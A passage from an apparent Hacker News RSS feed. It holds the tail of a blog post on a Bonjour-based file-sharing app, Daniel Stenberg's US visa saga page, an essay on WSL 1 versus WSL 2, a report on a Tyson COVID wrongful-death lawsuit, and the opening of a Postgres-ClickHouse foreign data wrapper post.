<p>The gold standard for service discovery seems to be <a href="https://en.wikipedia.org/wiki/Zero-configuration_networking#Apple_Bonjour">Bonjour or ZeroConf</a>. It appears to have started as an Apple technology, but is a standard used by most device these days. A quick review of the docs showed that it was exactly what we needed. Enables discovery of devices services on the network and we should share small payload of information as well. And of course it was multi-platform with convenient library in the Apple iOS development environment and python.</p>



<h3>Sharing</h3>



<p>The most obvious approach to share files between devices seem to be using http/https. Widely supported, easy to debug with many existing tools and of course it supports all kind of format that we needed. python and iOS have great support to do requests and good libraries to implement simple servers. One issue was that on iOS, an app needs to use the https protocol, but a quick search lead to a great little library to implement a server that supports https on iPhone called <a href="https://criollo.io/">Criollo.</a></p>



<h2>Last Missing Pieces</h2>



<p>Before we could really start, two major pieces remained to be agreed: the name and the icon!</p>



<p>Again two philosophies and two contenders for the name. The teen cool factor approach: <code>Galactic Clipboard</code> or the middle-age practical and plain one: <code>Remote Stash</code>. Because I was quicker to create the GitHub repo and I control our Apple Developer account for the App, I won with <a href="https://github.com/roznet/remotestash">RemoteStash</a>…</p>



<p>The Icon was less contentious. Turns out a teen living in an emacs and terminal environment is less interested in icons, so I quickly put one together</p>



<div><figure><img loading="lazy" width="150" height="150" src="https://i0.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x-150x150.png?resize=150%2C150&amp;ssl=1" alt="" srcset="https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?resize=150%2C150&amp;ssl=1 150w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?resize=300%2C300&amp;ssl=1 300w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?resize=1024%2C1024&amp;ssl=1 1024w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?resize=768%2C768&amp;ssl=1 768w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?resize=1536%2C1536&amp;ssl=1 1536w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?w=2048&amp;ssl=1 2048w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?w=1168&amp;ssl=1 1168w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?w=1752&amp;ssl=1 1752w" sizes="(max-width: 150px) 100vw, 150px" data-recalc-dims="1"></figure></div>



<p>Next we’ll look how we implemented the iPhone app before looking at the python script</p>



<p>But first you can see a video demo of the tool</p>



<figure><p><span><iframe width="584" height="329" src="https://www.youtube.com/embed/HmIlISPwmMs?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span>
</p></figure>
			</div></div>]]>
            </description>
            <link>https://ro-z.net/blog/ios-development/how-to-airdrop-to-linux-part-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25154508</guid>
            <pubDate>Thu, 19 Nov 2020 21:20:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Daniel Stenberg Is Finally Granted a US Visa]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25154334">thread link</a>) | @andrewnicolalde
<br/>
November 19, 2020 | https://daniel.haxx.se/us-visa.html#got-it | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/us-visa.html#got-it">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p> Time it took for Daniel to get a US visa </p>
<p><span>
 937 days
</span></p><p> Background </p>
<p>
 On June 26th 2017, Daniel was denied to travel to the US - while still having
 a valid ESTA and passport. He was then denied ESTA on April 3, 2018. When
 subsequently applying for a visa instead, there has been no response for over
 two years. (To <i>visit</i>, not to apply for permanent residency.)
</p><p> This page was edited with <a href="#got-it">new content</a> on:
 <b>November 9, 2020</b>
</p><p> Blog posts </p>
<p> First blog post: <a href="https://daniel.haxx.se/blog/2018/07/28/administrative-purgatory/">Administrative

 purgatory</a>
</p><p> The one year anniversary: <a href="https://daniel.haxx.se/blog/2019/04/17/one-year-in-still-no-visa/">One

year in still no visa</a>.
</p><p> <a href="https://daniel.haxx.se/blog/2020/04/17/two-years-in/">Two years in</a>

</p><p> Q&amp;A </p>
<p>
<a href="#got-it">Visa approved</a>
</p><div>
<p>
 937 days since my application, I have a visa in my passport. Valid for 10 years.
</p><p> As an unexpected bonus, there's also a 30 days "NIE" (National Interest
 Exception) that allows me a single entry to the US during "PP" (Presidential
 Proclamations) - which is restricting travels to the US from the European
 Schengen zone.
</p></div>
<p>
<a href="#parcel">"There's a package being delivered to you"</a>
</p><div>
<p>
 934 days into the process (10:30 November 6, 2020) I received this
 text on my phone, saying there's a parcel sent to me from "the
 Embassy of the United State".
</p><p>
<img src="https://daniel.haxx.se/media/embassy-text.png" width="600">
</p></div>
<p>
<a href="#send-in">Please send in your passport</a>
</p><div>
<p> On October 13, 2020 (910 days in), the embassy emailed me again,
asking me to "Please send in your passport for further processing."
</p><p> On October 16, I mailed it to the embassy.
</p></div>
<p>
<a href="#plans">Updated travel plans please!</a>
</p><div>
<p> On September 22, 2020 (889 days in), the US Embassy emailed me, and I will
quote verbatim from the email below.
</p><pre>Dear Sir,
&nbsp;
Your visa application is still in administrative processing. However, we regret to
inform you that because you have missed your travel plans, we will require updated
travel plans from you. If you intend to proceed with your visa application, we
therefore ask you to kindly send your updated travel plans, including any relevant
supporting documents (such as  an official invitation letter and financial support
letter/other financial supporting documents). Thank you.
</pre>
<p> So I need to provide updated plans and "invitation letters"...
</p><p> It seems reasonable to suspect that the embassy woke up and realized this
 after having being prodded by the <a href="#officials">congressman's
 email</a> a few days ago. The travel plans have been outdated for the last
 800 days or so and they only email to ask this now?
</p><p> On October 2, 220 (898 days in) I responded to the email with an
 invitation letter with an offer to visit my colleagues at wolfSSL in the US
 at two different future dates (one in December 2020, one in March 2021) and
 "All expenses, hotel, airfare, transportation and food will be paid for him".
 Signed by Larry Stefonic, CEO of wolfSSL.
</p></div>
<p>
<a href="#long">Do you know why this takes so long?</a>
</p><div>
<p> No. They've just informed me "someone is working on it" and that it "may
take a long time" but without qualifying what that means. They call it
"administrative processing."
</p><p> I have talked to several persons who've experienced similar situations, and
  I have learned about waiting times up to 20 months until a definite "no". I used
  to think of that as a sort of "worst case" waiting time. Now we know it can
  take longer...
</p></div>
<p>
<a href="#esta">Why don't you just apply for an ESTA?</a>
</p><p>
  I already did and they denied me that. See one of the <a href="#images">images below</a>.
</p>
<p>
Why did they deny you ESTA?
</p><p>
  I don't know as they won't tell. And I also don't know why they can't respond to my visa application.
</p>
<p>
<a href="#working">So, someone is working on it?</a>
</p><p>
  Allegedly, yes. I'm sure that person must be working very hard...
</p>
<p>
<a href="#eventually">Do you think they will grant you a visa eventually?</a>
</p><div>
<p>
  No. I have been in contact with many people who have been in similar
  situations such as this, as well as many people who have applied for visas
  for very complicated matters, and it is basically unheard of that it would
  take this long time and still end up with a positive response in the end.
</p><p>
  Someone emailed me and explained how they got their visa approved after 10
  months waiting - so it obviously <i>can</i> happen after a fairly
  long time!
</p></div>
<p>
<a name="#arab">Did you travel to any arab countries, middle-east, North Korea, Sudan, Iran or Iraq?</a>
</p><p>
 No.
</p>
<p>
<a name="#ever">Did you ever visit the US?</a>
</p><div>
<p> Yes, I have visted the US around a dozen times over a time period of almost
 twenty years. I have applied and gotten ESTA permissions several times. I have
 many friends living and working in the US.
</p><p> My latest visit to the US was in December 2016 - using the same ESTA and
 passport I subsequently wanted to use in the summer of 2017 when I was first
 denied travelling to the US.
</p></div>
<p>
<a href="#blocked">How many trips have this blocked you from taking so far?</a>
</p><div>
<p> I have been invited personally to several meetings in the US that I couldn't
 attend. (excluding IETF, HTTPbis or QUIC meetings)
</p><ol>
<li> San Francisco June 2017. Mozilla All Hands.
</li><li> San Francisco June 2018. Mozilla All hands.
</li><li> San Francisco October 2018. Conference speaking engagement.
</li><li> Orlando, Florida December 2018. Mozilla All hands.
</li><li> Portland, Oregon January 2019. Conference speaking engagement.
</li><li> California, March 2019. Conference speaking engagement.
</li><li> Summer of 2019. Wedding.
</li></ol>
</div>
<p>
<a href="#employer">Can't your employer help you?</a>
</p><p> We've already tried all available ways to get information or otherwise
bring this effort forward. To no avail.
</p>
<p>
<a href="#Mozilla">Will Mozilla move more meetings outside of the US?</a>
</p><p> Yes. Several of the coming All hands are now planned and scheduled to
happen outside of the US, for example in Canada and Germany. But I will not be
there to experience them since I quit Mozilla in December 2018.
</p>
<p>
Will your visa situation change when you've quit Mozilla?
</p><p> Unfortunately, there is no reason to suspect or hope so.
</p>
<p>
<a href="#lost">Maybe they lost your application?</a>
</p><div>
<p> I emailed them in July 2019 just to make sure they just hadn't
 forgot about my case or similar over the past year, and I received their
 reply on August 1st 2019. The response said "I have forwarded your email to
 my supervisor to highlight the problem."  - but then nothing more came.
</p><p> I emailed them again on January 28, 2020.<br>
<img src="https://daniel.haxx.se/media/651-days-email.png">
</p><p>
 They responded very politely:
 </p><pre>Dear Sir,
&nbsp;
All applications are processed in the most expeditious manner
possible. While we understand your frustration, we are required to follow
immigration law regarding visa issuances. This process cannot be expedited or
circumvented. Rest assured that we will contact you as soon as the
administrative processing is concluded.
</pre>
</div>
<p>
<a href="#likely">What do you think is the most likely explanation for this treatment?</a>
</p><div>
<p> I think one of the likelier explantions is that someone somewhere has
 found my name and my code used in some evil or malicious manner and drawn the
 wrong conclusions about how my code ended up there or how I could've been
 involved. Like for example in some malware, virus or other attack software. I
 make tools and code available for free and openly and sometimes those are
 unfortunately used in ways I don't condone.
</p><p> Since they won't tell me why, basically all theories are equally likely.
 We just won't know.
</p></div>
<p>
Any other plausible explanations?
</p><div>
<p> People have mentioned my domain name <b>haxx.se</b> or suggested it is
because I have referred to myself as "a hacker" at times. I find that unlikely
since I used the domain and used the term for decades before this.
</p><p> Others have offered the explanation that the immigration authorities
might've decided that I violated the ESTA rules in a previous visit. I can of
course not know what they think, but I have not violated those rules.
</p></div>
<p>
<a href="#crime">Convicted of a crime?</a>
</p><p>
No, I have never been convicted of a crime in Sweden and not anywhere
else. Not even charged. Nor have I ever been involved in a lawsuit of any
kind.
</p>
<p>
<a href="#license">Can you change the curl license?</a>
</p><div><p>
Lots of people suggest this, most probably in jest, but let me be perfectly
clear: no I won't change the curl license.
</p><ol>
 <li> excluding a specific user would make a license to not be open source anymore
 </li><li> curl has many more copyrights than mine, it would be hard
 </li><li> curl is bigger than me personally, I wouldn't do it anyway
</li></ol>
</div>
<p>
<a href="#covid">But Covid-19?</a>
</p><p>
During the Corona pandemic (starting in spring 2020), the US has closed its
borders for a lot of more people who otherwise would have been allowed
entry. I suspect the visa processing has slowed down during this period since
people can't go there anyway. But I have not been notified about anything and
I still expect to get a rejection at some point. Pandemic or not.
</p>
<p>
<a href="#officials">Have you contacted any US officials?</a>
</p><div><p>
A US citizen friend of mine sent the following text in an email to the
U.S. Congressman Gerry Connolly on September 3, 2020.
</p><pre>Dear Representative Gerry Connolly:
&nbsp;
Could you please help my friend Daniel Stenberg *finally* gain permission to
travel to the US? He has been denied permission to travel to the US for years,
yet there is no cause for it.
&nbsp;
On June 26, 2017, Mr. Stenberg was denied to travel to the US, even though he
had a valid ESTA and passport. He was then denied ESTA on April 3, 2018. He
then applied for a visa in April 2018, and has *still* not heard anything.
&nbsp;
This is especially galling because is a widely-known leader in the computer
community. He developed and maintains the "curl" program, a program used
worldwide by many software developers and computer system administrators. In
October 2017 he won the "Polhem prize" for his work on curl; in that ceremony
the Swedish king personally handed Daniel a gold medal. In February 2019 he
joined wolfSSL, an American company (he's their only Swedish hire), and yet
he's still not allowed to travel to the US.
&nbsp;
Perhaps there is a confusion about the word "hacker". In the computer
community, a "hacker" is NOT someone who breaks into computers, a hacker
is "a person who delights in having an intimate understanding of the
internal workings of a system, computers and computer networks in
particular."  ( IETF RFC 1983, https://tools.ietf.org/html/rfc1983).

Mr. Stenberg does *not* break into computers without authorization.
&nbsp;
At the least, the State Department should have asked questions instead of
reflexively denying entry to a world leader in the computer industry.
&nbsp;
More information is available on his personal website:
https://daniel.haxx.se/us-visa.html
</pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://daniel.haxx.se/us-visa.html#got-it">https://daniel.haxx.se/us-visa.html#got-it</a></em></p>]]>
            </description>
            <link>https://daniel.haxx.se/us-visa.html#got-it</link>
            <guid isPermaLink="false">hacker-news-small-sites-25154334</guid>
            <pubDate>Thu, 19 Nov 2020 21:04:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Windows Subsystem for Linux: The lost potential]]>
            </title>
            <description>
<![CDATA[
Score 297 | Comments 190 (<a href="https://news.ycombinator.com/item?id=25154300">thread link</a>) | @r0sk
<br/>
November 19, 2020 | https://jmmv.dev/2020/11/wsl-lost-potential.html | <a href="https://web.archive.org/web/*/https://jmmv.dev/2020/11/wsl-lost-potential.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
              
              <article><p>If you have followed Windows 10 at all during the last few years, you know that the <strong>Windows Subsystem for Linux</strong>, or <strong>WSL</strong> for short, is <em>the</em> hot topic among developers. You can finally run your Linux tooling on Windows as a first class citizen, which means you no longer have to learn PowerShell or, god forbid, suffer through the ancient <code>CMD.EXE</code> console.</p>
<p>Unfortunately, not everything is as rosy as it sounds. I now have to do development <em>on</em> Windows <em>for</em> Windows as part of my new role within Azure… and the fact that WSL continues to be separate from the native Windows environment shows. Even though I was quite hopeful, I cannot use WSL as my daily driver because I need to interact with “native” Windows tooling.</p>
<p>I believe things needn’t be this way, but with the recent push for WSL 2, I think that the potential of an alternate world is now gone. But what do I mean with this? For that, we must first understand the differences between WSL 1 and WSL 2 and how the push for WSL 2 may shut some interesting paths.</p>
<p><strong>DISCLAIMER:</strong> I have zero insight on what’s going on within the WSL team or what their future plans are. This is purely my personal opinion based on what I have experienced as a user.</p>

<p>Let’s first take a look at WSL 1, and for that, we must look at what’s in the awkward name. Why was this feature named Windows subsystem… <em>for</em> Linux? Isn’t that backwards? This is not a subsystem in Linux to do anything Windows-related; it’s the other way around!</p>
<p>Well… you see, the name is technically correct when considering the design of the Windows NT kernel. From the <a href="https://en.wikipedia.org/wiki/Architecture_of_Windows_NT">Architecture of Windows NT</a> page in the Wikipedia, we find (emphasis mine):</p>
<blockquote>
<p>User mode in Windows NT is made of subsystems capable of passing I/O requests to the appropriate kernel mode device drivers by using the I/O manager. <strong>The user mode layer of Windows NT is made up of the “Environment subsystems”, which run applications written for many different types of operating systems</strong>, and the “Integral subsystem”, which operates system-specific functions on behalf of environment subsystems. The kernel mode stops user mode services and applications from accessing critical areas of the operating system that they should not have access to.</p>
</blockquote>
<p>Windows NT was designed from the ground up to support running processes from a multitude of operating systems, and Win32 was “just” one of those environment subsystems. With these solid foundations, WSL 1 supplies a new environment subsystem, the Linux subsystem, to run Linux binaries atop the Windows NT kernel. Both the Win32 and Linux environment subsystems share the common integral subsystem.</p>
<p>Mumble jumbo. What does any of that actually mean?</p>
<p>Different system call “front-ends”—that’s what it means. A user-space process is a collection of binary instructions that the processor executes uninterruptedly (leaving interrupts aside). The operating system’s kernel is unaware of what the process is doing until the process issues a system call: at that point, the kernel regains control to perform an operation on behalf of the user, which can be something like reading a file or pausing for a few seconds.</p>
<p>The way a process issues system calls, and the semantics of those system calls, are specific to the operating system. For example, on old x86: opening a file on Win32 is system call number <code>17h</code> invoked via <code>INT 2Eh</code> whereas opening a file on Linux is system call number <code>5h</code> invoked via <code>INT 80h</code>.</p>
<p>But… conceptually, opening a file is opening a file, right? The fact that the system call numbers or the software interrupt numbers are different among them is not particularly interesting. And hereby lies the key design aspect of WSL 1: the Linux subsystem in the NT kernel is, simply put, an implementation of Linux’s system call layer in front of the NT kernel. These system calls later delegate to NT primitives, <em>not</em> Win32 calls. Which is important to repeat: there is no translation from Linux to Win32 system calls.</p>
<p>This is a feat of engineering considering how generally good support for Linux apps got to be under WSL 1 and the many ways in which NT internally differs from Unix, <code>fork+exec</code> being the eternal archenemy.</p>
<p>The true beauty of this design is that there is a single kernel running on the machine, and this kernel has a holistic view of all the processes beneath it. The kernel knows everything about the Win32 <em>and</em> Linux processes. And these processes all interact with unified resources, such a single networking stack, a single memory manager, and a single process scheduler.</p>

<p>If WSL 1 is so cool, then why does WSL 2 exist? Two reasons:</p>
<ul>
<li>WSL 1 has to, essentially, implement all of Linux’s kernel ABI, “bit by bit”. If there is a bug in that interface, the WSL 1 has to replicate it. And if there is a feature that is difficult to represent within the NT kernel, either the feature cannot be implemented or it needs extra kernel logic (and thus becomes slower).</li>
<li>Linux subsystem in WSL 1 has to abide by any “limitations” and inherent differences that exist between the NT kernel and the traditional Unix design. The most obvious one is the NTFS file system and its semantics, and how these differences harm performance of Linux binaries. Poor file system performance seems to be a common complaint in WSL 1.</li>
</ul>
<p>WSL 2 “throws away” all of the Linux subsystem parts of the name and replaces everything with a full-blown (but very well-hidden and fast) virtual machine. The virtual machine then runs a proper Linux kernel, a proper Linux file system, and a proper Linux networking stack within it.</p>
<p>What this means is that the beauty of the WSL 1 design is gone: the Windows NT kernel doesn’t get to see anything that happens within the Linux world any more. All it knows is that there is a big black box that does “stuff” inside, and all it gets to see are the <code>VMENTER</code> and <code>VMEXIT</code> hook points for virtual machines and block-level read/write requests on a virtual disk. The NT kernel is now unaware of Linux processes and file accesses. Similarly, the Linux kernel is unaware of anything in NT land.</p>
<p>You can read about some more differences in the <a href="https://docs.microsoft.com/en-us/windows/wsl/compare-versions">official documentation</a>.</p>

<p>From the user’s point of view, WSL 2 feels strictly better: Linux apps now run much, much faster because they are not subject to awkward Linux system call “emulation” within the NT kernel. If using NTFS with Linux semantics is difficult, that’s no problem because the Linux environment now uses ext4 on a virtual disk. And support for Linux apps can be much more complete, because, well, WSL 2 <em>is</em> Linux: if you want FUSE, to name something, you got it.</p>
<p>But this comes at the cost <em>of what WSL could have been</em>:</p>
<ul>
<li>Can you imagine how cool it would be if you could type <code>ps</code> or <code>top</code> within a WSL session and see Linux <em>and</em> Windows processes side-by-side, able to mutate their state with <code>kill</code>?</li>
<li>Can you imagine how cool it would be to manipulate Windows services from the WSL session?</li>
<li>Can you imagine how cool it would be if you could use <code>ifconfig</code> (wait, is that <code>ip</code>? 🙄) within a WSL session to inspect and modify the machine’s network interfaces?</li>
<li>Essentially, can you imagine doing all of your Windows system administration tasks from within WSL?</li>
</ul>
<p>Although this never existed, I can well imagine such a world… and it’s one that <em>only the WSL 1 design can provide</em>. And the reason I can imagine this is because macOS gives you this model (albeit cheating because macOS is essentially Unix).</p>
<p>Which is what brings me to my frustration: even though I could install WSL on my development machine for Azure, there is nothing I can use it for. I still have to interact with the system via <code>CMD.EXE</code> because I have to deal with Windows-native processes and resources, and because the tooling I have to deal with is Windows-only.</p>
<p>The FAQ for WSL 2 claims that <a href="https://docs.microsoft.com/en-us/windows/wsl/wsl2-faq#what-will-happen-to-wsl-1-will-it-be-abandoned">WSL 1 will not be abandoned</a>, and if we abide by Microsoft’s backwards-compatibility guarantee, that may be true. But keeping WSL 1 running is a monumental effort due to the need to keep up with Linux changes. Regardless, I hope that this is the case and that WSL 1 continues to exist. Who knows, maybe the reason WSL 1 stays behind is to pursue this magical world I’m describing? 🤔</p>

<p>I can’t finish this post without talking about the various BSDs. The BSDs, always trailing behind Linux and other commercial operating systems, have had binary-level compatibility for ages. The earliest I can find is Linux compatibility in the NetBSD kernel back in 1995. That’s 25 years ago, and 21 before WSL 1’s first debut.</p>
<p>And, heck, this isn’t limited to Linux. NetBSD has had support to emulate <em>various</em> different operating systems throughout the years. SVR4 support appeared in 1994 and, for a brief stint, <a href="https://man.netbsd.org/NetBSD-5.0/compat_pecoff.8">NetBSD even had support for… 🥁… PE/COFF binaries</a>—that’s right, Win32 binaries. So, in a way, NetBSD implemented the WSL 1 model in reverse: it let you run Win32 binaries atop the NetBSD kernel back in 2002.</p>
</article>
            </div>
          </div><div>
            <div>
              <p><b>Want more posts like this one? Take a moment to subscribe!</b></p>
            </div>
            <div>
              
              <p>
                  <a href="https://twitter.com/intent/follow?original_referer=https%3A%2F%2Fjmmv.dev%2F&amp;screen_name=jmmv">
                    <img src="https://jmmv.dev/images/badges/Twitter_logo_blue_32.png" alt="Follow @jmmv on Twitter">
                  </a>
                </p>
              <p><a href="https://jmmv.dev/feed.xml"><img src="https://jmmv.dev/images/badges/feed-icon-28x28.png" alt="RSS feed"></a></p>
            </div>
          </div><div>
            <div>
              <p><b>Enjoyed this article? Spread the word or join the ongoing discussion!</b></p>
            </div>
            
          </div></div>]]>
            </description>
            <link>https://jmmv.dev/2020/11/wsl-lost-potential.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25154300</guid>
            <pubDate>Thu, 19 Nov 2020 21:00:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lawsuit: Tyson managers bet money on how many workers would contract Covid-19]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25154104">thread link</a>) | @DanBC
<br/>
November 19, 2020 | https://iowacapitaldispatch.com/2020/11/18/lawsuit-tyson-managers-bet-money-on-how-many-workers-would-contract-covid-19/ | <a href="https://web.archive.org/web/*/https://iowacapitaldispatch.com/2020/11/18/lawsuit-tyson-managers-bet-money-on-how-many-workers-would-contract-covid-19/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        <div><figure><img width="2016" height="1512" src="https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility.jpg" srcset="https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility.jpg 2016w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-300x225.jpg 300w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-1024x768.jpg 1024w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-768x576.jpg 768w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-1536x1152.jpg 1536w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-80x60.jpg 80w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-265x198.jpg 265w" sizes="(max-width: 2016px) 100vw, 2016px" alt="" title="Workstation Dividers at Tyson Facility"><figcaption>Tyson workers have had plastic dividers separating them on the production line. (Photo provided by Tyson Fresh Meats)</figcaption></figure></div>
        <p>A wrongful death lawsuit tied to COVID-19 infections in a Waterloo pork processing plant alleges that during the initial stages of the pandemic, Tyson Foods ordered employees to report for work while supervisors privately wagered money on the number of workers who would be sickened by the deadly virus.</p>
<p>Earlier this year, the family of the late Isidro Fernandez sued the meatpacking company, alleging Fernandez was exposed to the coronavirus at the Waterloo plant where he worked. The lawsuit alleges Tyson Foods is guilty of a “willful and wanton disregard for workplace safety.”</p>
<p>In a written statement issued Thursday afternoon, Tyson Foods’ president and chief executive officer, Dean Banks, said: “We are extremely upset about the accusations involving some of the leadership at our Waterloo plant. Tyson Foods is a family company with 139,000 team members and these allegations do not represent who we are, or our core values and team behaviors. We expect every team member at Tyson Foods to operate with the utmost integrity and care in everything we do.</p>
<p>“We have suspended, without pay, the individuals allegedly involved and have retained the law firm Covington &amp; Burling LLP to conduct an independent investigation led by former Attorney General Eric Holder. If these claims are confirmed, we’ll take all measures necessary to root out and remove this disturbing behavior from our company.</p>
<p>“Our top priority is and remains the health and safety of our team members.”</p>
<p>Fernandez, who died on April 20, was one of at least five Waterloo plant employees who died of the virus. According to the Black Hawk County Health Department, more than 1,000 workers at the plant — over a third of the facility’s workforce — contracted the virus.</p>
<p>The lawsuit alleges that despite the uncontrolled spread of the virus at the plant, Tyson required its employees to work long hours in cramped conditions without providing the appropriate personal protective equipment and without ensuring workplace-safety measures were followed.</p>
<p>The lawsuit was recently amended and includes a number of new allegations against the company and plant officials. Among them:</p>
<ul>
<li>In mid-April, around the time Black Hawk County Sherriff Tony Thompson visited the plant and reported the working conditions there “shook [him] to the core,” plant manager Tom Hart organized a cash-buy-in, winner-take-all, betting pool for supervisors and managers to wager how many plant employees would test positive for COVID-19.</li>
<li>John Casey, an upper-level manager at the plant, is alleged to have explicitly directed supervisors to ignore symptoms of COVID-19, telling them to show up to work even if they were exhibiting symptoms of the virus. Casey reportedly referred to COVID-19 as the “glorified flu” and told workers not to worry about it because “it’s not a big deal” and “everyone is going to get it.” On one occasion, Casey intercepted a sick supervisor who was on his way to be tested and ordered him to get back to work, saying, “We all have symptoms — you have a job to do.” After one employee vomited on the production line, managers reportedly allowed the man to continue working and then return to work the next day.</li>
<li>In late March or early April, as the pandemic spread across Iowa, managers at the Waterloo plant reportedly began avoiding the plant floor for fear of contracting the virus. As a result, they increasingly delegated managerial authority and responsibilities to low-level supervisors who had no management training or experience. The supervisors did not require truck drivers and subcontractors to have their temperatures checked before entering the plant.</li>
<li>In March and April, plant supervisors falsely denied the existence of any confirmed cases or positive tests for COVID-19 within the plant, and allegedly told workers they had a responsibility to keep working to ensure Americans didn’t go hungry as the result of a shutdown.</li>
<li>Tyson paid out $500 “thank you bonuses” to employees who turned up for every scheduled shift for three months — a policy decision that allegedly incentivized sick workers to continue reporting for work.</li>
<li>Tyson executives allegedly lobbied Iowa Gov. Kim Reynolds for COVID-19 liability protections that would shield the company from lawsuits, and successfully lobbied the governor to declare that only the state government, not local governments, had the authority to close businesses in response to the pandemic.</li>
</ul>
<p>While Tyson has yet to file a formal response to the new allegations, it has said in previous court filings that it “vigorously disputes” the plaintiffs’ claims and has “invested millions of dollars to provide employees with safety and risk-mitigation equipment.”</p>
<p>The lawsuit claims that while Tyson has repeatedly claimed that its operations needed to remain open to feed America, the company increased its exports to China by 600% during the first quarter of 2020.</p>
<p>The lawsuit is seeking unspecified damages for fraudulent misrepresentation and gross negligence.</p>
<p>The case was initially filed in state court, claiming violations of Iowa law. At Tyson’s request, the case was moved to federal court, with the company claiming it had remained open during the pandemic “at the direction of a federal officer” — President Donald Trump, who, on April 28, invoked his authority under the <a href="https://iowacapitaldispatch.com/2020/05/04/trumps-critics-warn-his-order-to-keep-meat-plants-open-imperils-workers/">Defense Production Act</a> and ordered meat and poultry processing companies to continue operating.</p>
<p>The nonprofit organization Public Citizen has filed an amicus brief in the case, supporting the Fernandez family’s efforts to remand the action back to state court. In its brief, Public Citizen has said that neither the Defense Production Act nor the executive order signed by President Trump had “directed” Tyson to do anything.</p>
<p>The Waterloo facility is Tyson’s largest pork plant in the United States. The facility employs approximately 2,800 workers who process approximately 19,500 hogs per day.</p>

        </div></div>]]>
            </description>
            <link>https://iowacapitaldispatch.com/2020/11/18/lawsuit-tyson-managers-bet-money-on-how-many-workers-would-contract-covid-19/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25154104</guid>
            <pubDate>Thu, 19 Nov 2020 20:42:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Egui: Experimental immediate mode GUI library written in Rust]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25153975">thread link</a>) | @Jarred
<br/>
November 19, 2020 | https://emilk.github.io/egui/index.html | <a href="https://web.archive.org/web/*/https://emilk.github.io/egui/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://emilk.github.io/egui/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25153975</guid>
            <pubDate>Thu, 19 Nov 2020 20:30:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing a Postgres Foreign Data Wrapper for Clickhouse in Go]]>
            </title>
            <description>
<![CDATA[
Score 101 | Comments 24 (<a href="https://news.ycombinator.com/item?id=25153782">thread link</a>) | @arunk-s
<br/>
November 19, 2020 | https://arunsori.me/posts/postgres-clickhouse-fdw-in-go/ | <a href="https://web.archive.org/web/*/https://arunsori.me/posts/postgres-clickhouse-fdw-in-go/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				

<p><a href="https://www.postgresql.org/">Postgres</a>(hereinafter mentioned as PG) is a pretty cool database with lots of nice features, one of them little known ones is the ability of having Foreign data wrappers <a href="https://wiki.postgresql.org/wiki/Foreign_data_wrappers">(hereinafter mentioned as FDWs)</a>.</p>

<p><a href="https://clickhouse.tech/">Clickhouse</a>(hereinafter mentioned as CH) is another amazing database with an altogether different set of features targeted for OLAP use cases.</p>

<h2 id="what-are-foreign-data-wrappers-fdws-then">What are Foreign Data Wrappers (FDWs) then?</h2>

<p>Well unlike so many names in tech, we can actually infer some idea from the name itself in this case.
So FDWs in essence, allows to access <em>foreign</em> <em>data</em> sources inside Postgres(PG) via a set of <a href="https://www.postgresql.org/docs/current/fdwhandler.html">wrapper APIs</a>.</p>

<p>That is, you can access data sitting in a Mysql/SQlite/Clickhouse(<em>any other data source</em>) table inside PG as you would do for a normal PG table. Isn’t that amazing!</p>

<p>There are already numerous such FDWs. A list is available <a href="https://wiki.postgresql.org/wiki/Foreign_data_wrappers">here</a>.</p>

